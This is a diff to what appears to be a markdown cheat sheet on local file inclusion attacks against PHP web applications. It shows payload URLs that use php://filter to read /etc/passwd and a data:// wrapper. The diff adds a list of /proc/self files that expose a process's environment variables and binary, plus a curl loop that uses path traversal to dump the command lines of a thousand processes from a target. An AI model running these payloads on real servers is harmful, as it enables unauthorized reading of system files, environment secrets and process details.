@@ -171,7 +171,16 @@ require_once
 http://domain/page.php?file=php://filter/convert.base64-encode/resource=/etc/passwd
 http://domain/page.php?file=data://text/plain;base64,QW9DMyBpcyBmdW4hCg==
 ```
-> LFI can lead to RCE.
+> Use LFI to gather information about the system and processes
+```
+/proc/self/cmdline - get commandline of current process
+/proc/self/environ - get environment variables
+/proc/self/exe - get binary
+```
+> retrieve all information about all processes:
+```bash
+for i in $(seq 0 1000); do curl http://[URL]?page=../../../../proc/${i}/cmdline --output - > ${i}; done
+```
 
 ## LOG POISONING
 ```http
